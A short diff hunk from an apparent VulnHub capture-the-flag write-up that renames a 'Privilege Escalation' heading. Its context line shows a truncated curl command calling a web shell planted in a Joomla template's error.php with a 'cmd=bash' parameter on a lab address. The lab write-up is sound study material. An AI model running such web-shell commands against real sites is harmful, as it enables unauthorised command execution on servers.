@@ -120,7 +120,7 @@ curl -s http://192.168.56.115/templates/protostar/error.php/error.php?cmd=bash%2
 ![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/76f3165c-205f-4cf1-936a-41e65fcb418e)
 
 
-## Privilege Escalation
+## 3.Privilege Escalation
 
 First we look at kernel version :
 
